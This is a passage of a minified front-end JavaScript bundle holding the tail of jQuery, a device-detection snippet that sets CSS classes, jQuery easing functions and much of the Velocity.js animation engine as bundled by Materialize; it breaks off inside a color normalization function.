        return ("number" === t || "string" === t) && !isNaN(e - parseFloat(e))
    }, x.trim = function(e) {
        return null == e ? "" : (e + "").replace(Bt, "")
    }, "function" == typeof define && define.amd && define("jquery", [], (function() {
        return x
    }));
    var Qt = e.jQuery,
        Yt = e.$;
    return x.noConflict = function(t) {
        return e.$ === x && (e.$ = Yt), t && e.jQuery === x && (e.jQuery = Qt), x
    }, void 0 === t && (e.jQuery = e.$ = x), x
})), $((function() {
    window.navigator.userAgent.match(/Mobile/i) || navigator.userAgent.match(/Android/i) || navigator.userAgent.match(/webOS/i) || navigator.userAgent.match(/iPhone/i) || navigator.userAgent.match(/iPad/i) || navigator.userAgent.match(/iPod/i) || navigator.userAgent.match(/BlackBerry/i) || window.navigator.userAgent.match(/IEMobile/i) || navigator.userAgent.match(/Windows Phone/i) ? $("html").removeClass("no-touch").addClass("touch") : $("html").removeClass("touch").addClass("no-touch"), navigator.userAgent.toLocaleLowerCase(), "undefined" != typeof SVGRect ? $("html").addClass("svg") : $("html").addClass("no-svg"), navigator.platform.match(/(Mac)/i) && document.getElementsByTagName("html")[0].classList.add("mac")
}));
var _createClass = function() {
    function e(e, t) {
        for (var i = 0; i < t.length; i++) {
            var n = t[i];
            n.enumerable = n.enumerable || !1, n.configurable = !0, "value" in n && (n.writable = !0), Object.defineProperty(e, n.key, n)
        }
    }
    return function(t, i, n) {
        return i && e(t.prototype, i), n && e(t, n), t
    }
}();

function _classCallCheck(e, t) {
    if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
}
"undefined" == typeof jQuery && ("function" == typeof require ? jQuery = $ = require("jquery") : jQuery = $),
    function(e) {
        "function" == typeof define && define.amd ? define(["jquery"], (function(t) {
            return e(t)
        })) : "object" == typeof module && "object" == typeof module.exports ? exports = e(require("jquery")) : e(jQuery)
    }((function(e) {
        e.easing.jswing = e.easing.swing;
        var t = Math.pow,
            i = Math.sqrt,
            n = Math.sin,
            o = Math.cos,
            r = Math.PI,
            s = 1.70158,
            a = 1.525 * s,
            l = s + 1,
            c = 2 * r / 3,
            u = 2 * r / 4.5;

        function d(e) {
            var t = 7.5625,
                i = 2.75;
            return e < 1 / i ? t * e * e : e < 2 / i ? t * (e -= 1.5 / i) * e + .75 : e < 2.5 / i ? t * (e -= 2.25 / i) * e + .9375 : t * (e -= 2.625 / i) * e + .984375
        }
        e.extend(e.easing, {
            def: "easeOutQuad",
            swing: function(t) {
                return e.easing[e.easing.def](t)
            },
            easeInQuad: function(e) {
                return e * e
            },
            easeOutQuad: function(e) {
                return 1 - (1 - e) * (1 - e)
            },
            easeInOutQuad: function(e) {
                return e < .5 ? 2 * e * e : 1 - t(-2 * e + 2, 2) / 2
            },
            easeInCubic: function(e) {
                return e * e * e
            },
            easeOutCubic: function(e) {
                return 1 - t(1 - e, 3)
            },
            easeInOutCubic: function(e) {
                return e < .5 ? 4 * e * e * e : 1 - t(-2 * e + 2, 3) / 2
            },
            easeInQuart: function(e) {
                return e * e * e * e
            },
            easeOutQuart: function(e) {
                return 1 - t(1 - e, 4)
            },
            easeInOutQuart: function(e) {
                return e < .5 ? 8 * e * e * e * e : 1 - t(-2 * e + 2, 4) / 2
            },
            easeInQuint: function(e) {
                return e * e * e * e * e
            },
            easeOutQuint: function(e) {
                return 1 - t(1 - e, 5)
            },
            easeInOutQuint: function(e) {
                return e < .5 ? 16 * e * e * e * e * e : 1 - t(-2 * e + 2, 5) / 2
            },
            easeInSine: function(e) {
                return 1 - o(e * r / 2)
            },
            easeOutSine: function(e) {
                return n(e * r / 2)
            },
            easeInOutSine: function(e) {
                return -(o(r * e) - 1) / 2
            },
            easeInExpo: function(e) {
                return 0 === e ? 0 : t(2, 10 * e - 10)
            },
            easeOutExpo: function(e) {
                return 1 === e ? 1 : 1 - t(2, -10 * e)
            },
            easeInOutExpo: function(e) {
                return 0 === e ? 0 : 1 === e ? 1 : e < .5 ? t(2, 20 * e - 10) / 2 : (2 - t(2, -20 * e + 10)) / 2
            },
            easeInCirc: function(e) {
                return 1 - i(1 - t(e, 2))
            },
            easeOutCirc: function(e) {
                return i(1 - t(e - 1, 2))
            },
            easeInOutCirc: function(e) {
                return e < .5 ? (1 - i(1 - t(2 * e, 2))) / 2 : (i(1 - t(-2 * e + 2, 2)) + 1) / 2
            },
            easeInElastic: function(e) {
                return 0 === e ? 0 : 1 === e ? 1 : -t(2, 10 * e - 10) * n((10 * e - 10.75) * c)
            },
            easeOutElastic: function(e) {
                return 0 === e ? 0 : 1 === e ? 1 : t(2, -10 * e) * n((10 * e - .75) * c) + 1
            },
            easeInOutElastic: function(e) {
                return 0 === e ? 0 : 1 === e ? 1 : e < .5 ? -t(2, 20 * e - 10) * n((20 * e - 11.125) * u) / 2 : t(2, -20 * e + 10) * n((20 * e - 11.125) * u) / 2 + 1
            },
            easeInBack: function(e) {
                return l * e * e * e - s * e * e
            },
            easeOutBack: function(e) {
                return 1 + l * t(e - 1, 3) + s * t(e - 1, 2)
            },
            easeInOutBack: function(e) {
                return e < .5 ? t(2 * e, 2) * (7.189819 * e - a) / 2 : (t(2 * e - 2, 2) * ((a + 1) * (2 * e - 2) + a) + 2) / 2
            },
            easeInBounce: function(e) {
                return 1 - d(1 - e)
            },
            easeOutBounce: d,
            easeInOutBounce: function(e) {
                return e < .5 ? (1 - d(1 - 2 * e)) / 2 : (1 + d(2 * e - 1)) / 2
            }
        })
    })), jQuery.extend(jQuery.easing, {
        easeInOutMaterial: function(e, t, i, n, o) {
            return (t /= o / 2) < 1 ? n / 2 * t * t + i : n / 4 * ((t -= 2) * t * t + 2) + i
        }
    }), jQuery.Velocity ? console.log("Velocity is already loaded. You may be needlessly importing Velocity again; note that Materialize includes Velocity.") : (function(e) {
        function t(e) {
            var t = e.length,
                n = i.type(e);
            return "function" !== n && !i.isWindow(e) && (!(1 !== e.nodeType || !t) || "array" === n || 0 === t || "number" == typeof t && t > 0 && t - 1 in e)
        }
        if (!e.jQuery) {
            var i = function(e, t) {
                return new i.fn.init(e, t)
            };
            i.isWindow = function(e) {
                return null != e && e == e.window
            }, i.type = function(e) {
                return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? o[s.call(e)] || "object" : typeof e
            }, i.isArray = Array.isArray || function(e) {
                return "array" === i.type(e)
            }, i.isPlainObject = function(e) {
                var t;
                if (!e || "object" !== i.type(e) || e.nodeType || i.isWindow(e)) return !1;
                try {
                    if (e.constructor && !r.call(e, "constructor") && !r.call(e.constructor.prototype, "isPrototypeOf")) return !1
                } catch (e) {
                    return !1
                }
                for (t in e);
                return void 0 === t || r.call(e, t)
            }, i.each = function(e, i, n) {
                var o = 0,
                    r = e.length,
                    s = t(e);
                if (n) {
                    if (s)
                        for (; r > o && !1 !== i.apply(e[o], n); o++);
                    else
                        for (o in e)
                            if (!1 === i.apply(e[o], n)) break
                } else if (s)
                    for (; r > o && !1 !== i.call(e[o], o, e[o]); o++);
                else
                    for (o in e)
                        if (!1 === i.call(e[o], o, e[o])) break;
                return e
            }, i.data = function(e, t, o) {
                if (void 0 === o) {
                    var r = (s = e[i.expando]) && n[s];
                    if (void 0 === t) return r;
                    if (r && t in r) return r[t]
                } else if (void 0 !== t) {
                    var s = e[i.expando] || (e[i.expando] = ++i.uuid);
                    return n[s] = n[s] || {}, n[s][t] = o, o
                }
            }, i.removeData = function(e, t) {
                var o = e[i.expando],
                    r = o && n[o];
                r && i.each(t, (function(e, t) {
                    delete r[t]
                }))
            }, i.extend = function() {
                var e, t, n, o, r, s, a = arguments[0] || {},
                    l = 1,
                    c = arguments.length,
                    u = !1;
                for ("boolean" == typeof a && (u = a, a = arguments[l] || {}, l++), "object" != typeof a && "function" !== i.type(a) && (a = {}), l === c && (a = this, l--); c > l; l++)
                    if (null != (r = arguments[l]))
                        for (o in r) e = a[o], a !== (n = r[o]) && (u && n && (i.isPlainObject(n) || (t = i.isArray(n))) ? (t ? (t = !1, s = e && i.isArray(e) ? e : []) : s = e && i.isPlainObject(e) ? e : {}, a[o] = i.extend(u, s, n)) : void 0 !== n && (a[o] = n));
                return a
            }, i.queue = function(e, n, o) {
                if (e) {
                    n = (n || "fx") + "queue";
                    var r = i.data(e, n);
                    return o ? (!r || i.isArray(o) ? r = i.data(e, n, function(e, i) {
                        var n = [];
                        return null != e && (t(Object(e)) ? function(e, t) {
                            for (var i = +t.length, n = 0, o = e.length; i > n;) e[o++] = t[n++];
                            if (i != i)
                                for (; void 0 !== t[n];) e[o++] = t[n++];
                            e.length = o
                        }(n, "string" == typeof e ? [e] : e) : [].push.call(n, e)), n
                    }(o)) : r.push(o), r) : r || []
                }
            }, i.dequeue = function(e, t) {
                i.each(e.nodeType ? [e] : e, (function(e, n) {
                    t = t || "fx";
                    var o = i.queue(n, t),
                        r = o.shift();
                    "inprogress" === r && (r = o.shift()), r && ("fx" === t && o.unshift("inprogress"), r.call(n, (function() {
                        i.dequeue(n, t)
                    })))
                }))
            }, i.fn = i.prototype = {
                init: function(e) {
                    if (e.nodeType) return this[0] = e, this;
                    throw new Error("Not a DOM node.")
                },
                offset: function() {
                    var t = this[0].getBoundingClientRect ? this[0].getBoundingClientRect() : {
                        top: 0,
                        left: 0
                    };
                    return {
                        top: t.top + (e.pageYOffset || document.scrollTop || 0) - (document.clientTop || 0),
                        left: t.left + (e.pageXOffset || document.scrollLeft || 0) - (document.clientLeft || 0)
                    }
                },
                position: function() {
                    function e() {
                        for (var e = this.offsetParent || document; e && "html" === !e.nodeType.toLowerCase && "static" === e.style.position;) e = e.offsetParent;
                        return e || document
                    }
                    var t = this[0],
                        e = e.apply(t),
                        n = this.offset(),
                        o = /^(?:body|html)$/i.test(e.nodeName) ? {
                            top: 0,
                            left: 0
                        } : i(e).offset();
                    return n.top -= parseFloat(t.style.marginTop) || 0, n.left -= parseFloat(t.style.marginLeft) || 0, e.style && (o.top += parseFloat(e.style.borderTopWidth) || 0, o.left += parseFloat(e.style.borderLeftWidth) || 0), {
                        top: n.top - o.top,
                        left: n.left - o.left
                    }
                }
            };
            var n = {};
            i.expando = "velocity" + (new Date).getTime(), i.uuid = 0;
            for (var o = {}, r = o.hasOwnProperty, s = o.toString, a = "Boolean Number String Function Array Date RegExp Object Error".split(" "), l = 0; l < a.length; l++) o["[object " + a[l] + "]"] = a[l].toLowerCase();
            i.fn.init.prototype = i.fn, e.Velocity = {
                Utilities: i
            }
        }
    }(window), function(e) {
        "object" == typeof module && "object" == typeof module.exports ? module.exports = e() : "function" == typeof define && define.amd ? define(e) : e()
    }((function() {
        return function(e, t, i, n) {
            function o(e) {
                return h.isWrapped(e) ? e = [].slice.call(e) : h.isNode(e) && (e = [e]), e
            }

            function r(e) {
                var t = d.data(e, "velocity");
                return null === t ? n : t
            }

            function s(e) {
                return function(t) {
                    return Math.round(t * e) * (1 / e)
                }
            }

            function a(e, i, n, o) {
                function r(e, t) {
                    return 1 - 3 * t + 3 * e
                }

                function s(e, t) {
                    return 3 * t - 6 * e
                }

                function a(e) {
                    return 3 * e
                }

                function l(e, t, i) {
                    return ((r(t, i) * e + s(t, i)) * e + a(t)) * e
                }

                function c(e, t, i) {
                    return 3 * r(t, i) * e * e + 2 * s(t, i) * e + a(t)
                }

                function f(t) {
                    for (var i = 0, o = 1, r = b - 1; o != r && C[o] <= t; ++o) i += w;
                    --o;
                    var s = i + (t - C[o]) / (C[o + 1] - C[o]) * w,
                        a = c(s, e, n);
                    return a >= g ? function u(t, i) {
                        for (var o = 0; v > o; ++o) {
                            var r = c(i, e, n);
                            if (0 === r) return i;
                            i -= (l(i, e, n) - t) / r
                        }
                        return i
                    }(t, s) : 0 == a ? s : function p(t, i, o) {
                        var r, s, a = 0;
                        do {
                            (r = l(s = i + (o - i) / 2, e, n) - t) > 0 ? o = s : i = s
                        } while (Math.abs(r) > m && ++a < y);
                        return s
                    }(t, i, i + w)
                }

                function h() {
                    T = !0, (e != i || n != o) && function d() {
                        for (var t = 0; b > t; ++t) C[t] = l(t * w, e, n)
                    }()
                }
                var v = 4,
                    g = .001,
                    m = 1e-7,
                    y = 10,
                    b = 11,
                    w = 1 / (b - 1),
                    x = "Float32Array" in t;
                if (4 !== arguments.length) return !1;
                for (var k = 0; 4 > k; ++k)
                    if ("number" != typeof arguments[k] || isNaN(arguments[k]) || !isFinite(arguments[k])) return !1;
                e = Math.min(e, 1), n = Math.min(n, 1), e = Math.max(e, 0), n = Math.max(n, 0);
                var C = x ? new Float32Array(b) : new Array(b),
                    T = !1,
                    S = function(t) {
                        return T || h(), e === i && n === o ? t : 0 === t ? 0 : 1 === t ? 1 : l(f(t), i, o)
                    };
                S.getControlPoints = function() {
                    return [{
                        x: e,
                        y: i
                    }, {
                        x: n,
                        y: o
                    }]
                };
                var A = "generateBezier(" + [e, i, n, o] + ")";
                return S.toString = function() {
                    return A
                }, S
            }

            function l(e, t) {
                var i = e;
                return h.isString(e) ? y.Easings[e] || (i = !1) : i = h.isArray(e) && 1 === e.length ? s.apply(null, e) : h.isArray(e) && 2 === e.length ? b.apply(null, e.concat([t])) : !(!h.isArray(e) || 4 !== e.length) && a.apply(null, e), !1 === i && (i = y.Easings[y.defaults.easing] ? y.defaults.easing : m), i
            }

            function c(e) {
                if (e) {
                    var t = (new Date).getTime(),
                        i = y.State.calls.length;
                    i > 1e4 && (y.State.calls = function(e) {
                        for (var t = -1, i = e ? e.length : 0, n = []; ++t < i;) {
                            var o = e[t];
                            o && n.push(o)
                        }
                        return n
                    }(y.State.calls));
                    for (var o = 0; i > o; o++)
                        if (y.State.calls[o]) {
                            var s = y.State.calls[o],
                                a = s[0],
                                l = s[2],
                                p = s[3],
                                f = !!p,
                                v = null;
                            p || (p = y.State.calls[o][3] = t - 16);
                            for (var g = Math.min((t - p) / l.duration, 1), m = 0, b = a.length; b > m; m++) {
                                var x = a[m],
                                    C = x.element;
                                if (r(C)) {
                                    var T = !1;
                                    for (var S in l.display !== n && null !== l.display && "none" !== l.display && ("flex" === l.display && d.each(["-webkit-box", "-moz-box", "-ms-flexbox", "-webkit-flex"], (function(e, t) {
                                            w.setPropertyValue(C, "display", t)
                                        })), w.setPropertyValue(C, "display", l.display)), l.visibility !== n && "hidden" !== l.visibility && w.setPropertyValue(C, "visibility", l.visibility), x)
                                        if ("element" !== S) {
                                            var A, $ = x[S],
                                                E = h.isString($.easing) ? y.Easings[$.easing] : $.easing;
                                            if (1 === g) A = $.endValue;
                                            else {
                                                var P = $.endValue - $.startValue;
                                                if (A = $.startValue + P * E(g, l, P), !f && A === $.currentValue) continue
                                            }
                                            if ($.currentValue = A, "tween" === S) v = A;
                                            else {
                                                if (w.Hooks.registered[S]) {
                                                    var O = w.Hooks.getRoot(S),
                                                        D = r(C).rootPropertyValueCache[O];
                                                    D && ($.rootPropertyValue = D)
                                                }
                                                var M = w.setPropertyValue(C, S, $.currentValue + (0 === parseFloat(A) ? "" : $.unitType), $.rootPropertyValue, $.scrollData);
                                                w.Hooks.registered[S] && (r(C).rootPropertyValueCache[O] = w.Normalizations.registered[O] ? w.Normalizations.registered[O]("extract", null, M[1]) : M[1]), "transform" === M[0] && (T = !0)
                                            }
                                        } l.mobileHA && r(C).transformCache.translate3d === n && (r(C).transformCache.translate3d = "(0px, 0px, 0px)", T = !0), T && w.flushTransformCache(C)
                                }
                            }
                            l.display !== n && "none" !== l.display && (y.State.calls[o][2].display = !1), l.visibility !== n && "hidden" !== l.visibility && (y.State.calls[o][2].visibility = !1), l.progress && l.progress.call(s[1], s[1], g, Math.max(0, p + l.duration - t), p, v), 1 === g && u(o)
                        }
                }
                y.State.isTicking && k(c)
            }

            function u(e, t) {
                if (!y.State.calls[e]) return !1;
                for (var i = y.State.calls[e][0], o = y.State.calls[e][1], s = y.State.calls[e][2], a = y.State.calls[e][4], l = !1, c = 0, u = i.length; u > c; c++) {
                    var p = i[c].element;
                    if (t || s.loop || ("none" === s.display && w.setPropertyValue(p, "display", s.display), "hidden" === s.visibility && w.setPropertyValue(p, "visibility", s.visibility)), !0 !== s.loop && (d.queue(p)[1] === n || !/\.velocityQueueEntryFlag/i.test(d.queue(p)[1])) && r(p)) {
                        r(p).isAnimating = !1, r(p).rootPropertyValueCache = {};
                        var f = !1;
                        d.each(w.Lists.transforms3D, (function(e, t) {
                            var i = /^scale/.test(t) ? 1 : 0,
                                o = r(p).transformCache[t];
                            r(p).transformCache[t] !== n && new RegExp("^\\(" + i + "[^.]").test(o) && (f = !0, delete r(p).transformCache[t])
                        })), s.mobileHA && (f = !0, delete r(p).transformCache.translate3d), f && w.flushTransformCache(p), w.Values.removeClass(p, "velocity-animating")
                    }
                    if (!t && s.complete && !s.loop && c === u - 1) try {
                        s.complete.call(o, o)
                    } catch (e) {
                        setTimeout((function() {
                            throw e
                        }), 1)
                    }
                    a && !0 !== s.loop && a(o), r(p) && !0 === s.loop && !t && (d.each(r(p).tweensContainer, (function(e, t) {
                        /^rotate/.test(e) && 360 === parseFloat(t.endValue) && (t.endValue = 0, t.startValue = 360), /^backgroundPosition/.test(e) && 100 === parseFloat(t.endValue) && "%" === t.unitType && (t.endValue = 0, t.startValue = 100)
                    })), y(p, "reverse", {
                        loop: !0,
                        delay: s.delay
                    })), !1 !== s.queue && d.dequeue(p, s.queue)
                }
                y.State.calls[e] = !1;
                for (var h = 0, v = y.State.calls.length; v > h; h++)
                    if (!1 !== y.State.calls[h]) {
                        l = !0;
                        break
                    }! 1 === l && (y.State.isTicking = !1, delete y.State.calls, y.State.calls = [])
            }
            var d, p = function() {
                    if (i.documentMode) return i.documentMode;
                    for (var e = 7; e > 4; e--) {
                        var t = i.createElement("div");
                        if (t.innerHTML = "\x3c!--[if IE " + e + "]><span></span><![endif]--\x3e", t.getElementsByTagName("span").length) return t = null, e
                    }
                    return n
                }(),
                f = function() {
                    var e = 0;
                    return t.webkitRequestAnimationFrame || t.mozRequestAnimationFrame || function(t) {
                        var i, n = (new Date).getTime();
                        return i = Math.max(0, 16 - (n - e)), e = n + i, setTimeout((function() {
                            t(n + i)
                        }), i)
                    }
                }(),
                h = {
                    isString: function(e) {
                        return "string" == typeof e
                    },
                    isArray: Array.isArray || function(e) {
                        return "[object Array]" === Object.prototype.toString.call(e)
                    },
                    isFunction: function(e) {
                        return "[object Function]" === Object.prototype.toString.call(e)
                    },
                    isNode: function(e) {
                        return e && e.nodeType
                    },
                    isNodeList: function(e) {
                        return "object" == typeof e && /^\[object (HTMLCollection|NodeList|Object)\]$/.test(Object.prototype.toString.call(e)) && e.length !== n && (0 === e.length || "object" == typeof e[0] && e[0].nodeType > 0)
                    },
                    isWrapped: function(e) {
                        return e && (e.jquery || t.Zepto && t.Zepto.zepto.isZ(e))
                    },
                    isSVG: function(e) {
                        return t.SVGElement && e instanceof t.SVGElement
                    },
                    isEmptyObject: function(e) {
                        for (var t in e) return !1;
                        return !0
                    }
                },
                v = !1;
            if (e.fn && e.fn.jquery ? (d = e, v = !0) : d = t.Velocity.Utilities, 8 >= p && !v) throw new Error("Velocity: IE8 and below require jQuery to be loaded before Velocity.");
            if (!(7 >= p)) {
                var m = "swing",
                    y = {
                        State: {
                            isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
                            isAndroid: /Android/i.test(navigator.userAgent),
                            isGingerbread: /Android 2\.3\.[3-7]/i.test(navigator.userAgent),
                            isChrome: t.chrome,
                            isFirefox: /Firefox/i.test(navigator.userAgent),
                            prefixElement: i.createElement("div"),
                            prefixMatches: {},
                            scrollAnchor: null,
                            scrollPropertyLeft: null,
                            scrollPropertyTop: null,
                            isTicking: !1,
                            calls: []
                        },
                        CSS: {},
                        Utilities: d,
                        Redirects: {},
                        Easings: {},
                        Promise: t.Promise,
                        defaults: {
                            queue: "",
                            duration: 400,
                            easing: m,
                            begin: n,
                            complete: n,
                            progress: n,
                            display: n,
                            visibility: n,
                            loop: !1,
                            delay: !1,
                            mobileHA: !0,
                            _cacheValues: !0
                        },
                        init: function(e) {
                            d.data(e, "velocity", {
                                isSVG: h.isSVG(e),
                                isAnimating: !1,
                                computedStyle: null,
                                tweensContainer: null,
                                rootPropertyValueCache: {},
                                transformCache: {}
                            })
                        },
                        hook: null,
                        mock: !1,
                        version: {
                            major: 1,
                            minor: 2,
                            patch: 2
                        },
                        debug: !1
                    };
                t.pageYOffset !== n ? (y.State.scrollAnchor = t, y.State.scrollPropertyLeft = "pageXOffset", y.State.scrollPropertyTop = "pageYOffset") : (y.State.scrollAnchor = i.documentElement || i.body.parentNode || i.body, y.State.scrollPropertyLeft = "scrollLeft", y.State.scrollPropertyTop = "scrollTop");
                var b = function() {
                    function e(e) {
                        return -e.tension * e.x - e.friction * e.v
                    }

                    function t(t, i, n) {
                        var o = {
                            x: t.x + n.dx * i,
                            v: t.v + n.dv * i,
                            tension: t.tension,
                            friction: t.friction
                        };
                        return {
                            dx: o.v,
                            dv: e(o)
                        }
                    }

                    function i(i, n) {
                        var o = {
                                dx: i.v,
                                dv: e(i)
                            },
                            r = t(i, .5 * n, o),
                            s = t(i, .5 * n, r),
                            a = t(i, n, s),
                            l = 1 / 6 * (o.dx + 2 * (r.dx + s.dx) + a.dx),
                            c = 1 / 6 * (o.dv + 2 * (r.dv + s.dv) + a.dv);
                        return i.x = i.x + l * n, i.v = i.v + c * n, i
                    }
                    return function e(t, n, o) {
                        var r, s, a, l = {
                                x: -1,
                                v: 0,
                                tension: null,
                                friction: null
                            },
                            c = [0],
                            u = 0,
                            d = 1e-4;
                        for (t = parseFloat(t) || 500, n = parseFloat(n) || 20, o = o || null, l.tension = t, l.friction = n, s = (r = null !== o) ? (u = e(t, n)) / o * .016 : .016; a = i(a || l, s), c.push(1 + a.x), u += 16, Math.abs(a.x) > d && Math.abs(a.v) > d;);
                        return r ? function(e) {
                            return c[e * (c.length - 1) | 0]
                        } : u
                    }
                }();
                y.Easings = {
                    linear: function(e) {
                        return e
                    },
                    swing: function(e) {
                        return .5 - Math.cos(e * Math.PI) / 2
                    },
                    spring: function(e) {
                        return 1 - Math.cos(4.5 * e * Math.PI) * Math.exp(6 * -e)
                    }
                }, d.each([
                    ["ease", [.25, .1, .25, 1]],
                    ["ease-in", [.42, 0, 1, 1]],
                    ["ease-out", [0, 0, .58, 1]],
                    ["ease-in-out", [.42, 0, .58, 1]],
                    ["easeInSine", [.47, 0, .745, .715]],
                    ["easeOutSine", [.39, .575, .565, 1]],
                    ["easeInOutSine", [.445, .05, .55, .95]],
                    ["easeInQuad", [.55, .085, .68, .53]],
                    ["easeOutQuad", [.25, .46, .45, .94]],
                    ["easeInOutQuad", [.455, .03, .515, .955]],
                    ["easeInCubic", [.55, .055, .675, .19]],
                    ["easeOutCubic", [.215, .61, .355, 1]],
                    ["easeInOutCubic", [.645, .045, .355, 1]],
                    ["easeInQuart", [.895, .03, .685, .22]],
                    ["easeOutQuart", [.165, .84, .44, 1]],
                    ["easeInOutQuart", [.77, 0, .175, 1]],
                    ["easeInQuint", [.755, .05, .855, .06]],
                    ["easeOutQuint", [.23, 1, .32, 1]],
                    ["easeInOutQuint", [.86, 0, .07, 1]],
                    ["easeInExpo", [.95, .05, .795, .035]],
                    ["easeOutExpo", [.19, 1, .22, 1]],
                    ["easeInOutExpo", [1, 0, 0, 1]],
                    ["easeInCirc", [.6, .04, .98, .335]],
                    ["easeOutCirc", [.075, .82, .165, 1]],
                    ["easeInOutCirc", [.785, .135, .15, .86]]
                ], (function(e, t) {
                    y.Easings[t[0]] = a.apply(null, t[1])
                }));
                var w = y.CSS = {
                    RegEx: {
                        isHex: /^#([A-f\d]{3}){1,2}$/i,
                        valueUnwrap: /^[A-z]+\((.*)\)$/i,
                        wrappedValueAlreadyExtracted: /[0-9.]+ [0-9.]+ [0-9.]+( [0-9.]+)?/,
                        valueSplit: /([A-z]+\(.+\))|(([A-z0-9#-.]+?)(?=\s|$))/gi
                    },
                    Lists: {
                        colors: ["fill", "stroke", "stopColor", "color", "backgroundColor", "borderColor", "borderTopColor", "borderRightColor", "borderBottomColor", "borderLeftColor", "outlineColor"],
                        transformsBase: ["translateX", "translateY", "scale", "scaleX", "scaleY", "skewX", "skewY", "rotateZ"],
                        transforms3D: ["transformPerspective", "translateZ", "scaleZ", "rotateX", "rotateY"]
                    },
                    Hooks: {
                        templates: {
                            textShadow: ["Color X Y Blur", "black 0px 0px 0px"],
                            boxShadow: ["Color X Y Blur Spread", "black 0px 0px 0px 0px"],
                            clip: ["Top Right Bottom Left", "0px 0px 0px 0px"],
                            backgroundPosition: ["X Y", "0% 0%"],
                            transformOrigin: ["X Y Z", "50% 50% 0px"],
                            perspectiveOrigin: ["X Y", "50% 50%"]
                        },
                        registered: {},
                        register: function() {
                            for (var e = 0; e < w.Lists.colors.length; e++) {
                                var t = "color" === w.Lists.colors[e] ? "0 0 0 1" : "255 255 255 1";
                                w.Hooks.templates[w.Lists.colors[e]] = ["Red Green Blue Alpha", t]
                            }
                            var i, n, o;
                            if (p)
                                for (i in w.Hooks.templates) {
                                    o = (n = w.Hooks.templates[i])[0].split(" ");
                                    var r = n[1].match(w.RegEx.valueSplit);
                                    "Color" === o[0] && (o.push(o.shift()), r.push(r.shift()), w.Hooks.templates[i] = [o.join(" "), r.join(" ")])
                                }
                            for (i in w.Hooks.templates)
                                for (var e in o = (n = w.Hooks.templates[i])[0].split(" ")) {
                                    var s = i + o[e],
                                        a = e;
                                    w.Hooks.registered[s] = [i, a]
                                }
                        },
                        getRoot: function(e) {
                            var t = w.Hooks.registered[e];
                            return t ? t[0] : e
                        },
                        cleanRootPropertyValue: function(e, t) {
                            return w.RegEx.valueUnwrap.test(t) && (t = t.match(w.RegEx.valueUnwrap)[1]), w.Values.isCSSNullValue(t) && (t = w.Hooks.templates[e][1]), t
                        },
                        extractValue: function(e, t) {
                            var i = w.Hooks.registered[e];
                            if (i) {
                                var n = i[0],
                                    o = i[1];
                                return (t = w.Hooks.cleanRootPropertyValue(n, t)).toString().match(w.RegEx.valueSplit)[o]
                            }
                            return t
                        },
                        injectValue: function(e, t, i) {
                            var n = w.Hooks.registered[e];
                            if (n) {
                                var o, r = n[0],
                                    s = n[1];
                                return (o = (i = w.Hooks.cleanRootPropertyValue(r, i)).toString().match(w.RegEx.valueSplit))[s] = t, o.join(" ")
                            }
                            return i
                        }
                    },
                    Normalizations: {
                        registered: {
                            clip: function(e, t, i) {
                                switch (e) {
                                    case "name":
                                        return "clip";
                                    case "extract":
                                        var n;
                                        return n = w.RegEx.wrappedValueAlreadyExtracted.test(i) ? i : (n = i.toString().match(w.RegEx.valueUnwrap)) ? n[1].replace(/,(\s+)?/g, " ") : i;
                                    case "inject":
                                        return "rect(" + i + ")"
                                }
                            },
                            blur: function(e, t, i) {
                                switch (e) {
                                    case "name":
                                        return y.State.isFirefox ? "filter" : "-webkit-filter";
                                    case "extract":
                                        var n = parseFloat(i);
                                        if (!n && 0 !== n) {
                                            var o = i.toString().match(/blur\(([0-9]+[A-z]+)\)/i);
                                            n = o ? o[1] : 0
                                        }
                                        return n;
                                    case "inject":
                                        return parseFloat(i) ? "blur(" + i + ")" : "none"
                                }
                            },
                            opacity: function(e, t, i) {
                                if (8 >= p) switch (e) {
                                    case "name":
                                        return "filter";
                                    case "extract":
                                        var n = i.toString().match(/alpha\(opacity=(.*)\)/i);
                                        return n ? n[1] / 100 : 1;
                                    case "inject":
                                        return t.style.zoom = 1, parseFloat(i) >= 1 ? "" : "alpha(opacity=" + parseInt(100 * parseFloat(i), 10) + ")"
                                } else switch (e) {
                                    case "name":
                                        return "opacity";
                                    case "extract":
                                    case "inject":
                                        return i
                                }
                            }
                        },
                        register: function() {
                            9 >= p || y.State.isGingerbread || (w.Lists.transformsBase = w.Lists.transformsBase.concat(w.Lists.transforms3D));
                            for (var e = 0; e < w.Lists.transformsBase.length; e++) ! function() {
                                var t = w.Lists.transformsBase[e];
                                w.Normalizations.registered[t] = function(e, i, o) {
                                    switch (e) {
                                        case "name":
                                            return "transform";
                                        case "extract":
                                            return r(i) === n || r(i).transformCache[t] === n ? /^scale/i.test(t) ? 1 : 0 : r(i).transformCache[t].replace(/[()]/g, "");
                                        case "inject":
                                            var s = !1;
                                            switch (t.substr(0, t.length - 1)) {
                                                case "translate":
                                                    s = !/(%|px|em|rem|vw|vh|\d)$/i.test(o);
                                                    break;
                                                case "scal":
                                                case "scale":
                                                    y.State.isAndroid && r(i).transformCache[t] === n && 1 > o && (o = 1), s = !/(\d)$/i.test(o);
                                                    break;
                                                case "skew":
                                                case "rotate":
                                                    s = !/(deg|\d)$/i.test(o)
                                            }
                                            return s || (r(i).transformCache[t] = "(" + o + ")"), r(i).transformCache[t]
                                    }
                                }
                            }();
                            for (e = 0; e < w.Lists.colors.length; e++) ! function() {
                                var t = w.Lists.colors[e];
                                w.Normalizations.registered[t] = function(e, i, o) {
                                    switch (e) {
                                        case "name":
                                            return t;
                                        case "extract":
                                            var r;
                                            if (w.RegEx.wrappedValueAlreadyExtracted.test(o)) r = o;
                                            else {
                                                var s, a = {
                                                    black: "rgb(0, 0, 0)",
                                                    blue: "rgb(0, 0, 255)",
                                                    gray: "rgb(128, 128, 128)",
                                                    green: "rgb(0, 128, 0)",
                                                    red: "rgb(255, 0, 0)",
                                                    white: "rgb(255, 255, 255)"
                                                };
                                                /^[A-z]+$/i.test(o) ? s = a[o] !== n ? a[o] : a.black : w.RegEx.isHex.test(o) ? s = "rgb(" + w.Values.hexToRgb(o).join(" ") + ")" : /^rgba?\(/i.test(o) || (s = a.black), r = (s || o).toString().match(w.RegEx.valueUnwrap)[1].replace(/,(\s+)?/g, " ")
                                            }
                                            return 8 >= p || 3 !== r.split(" ").length || (r += " 1"), r;
                                        case "inject":
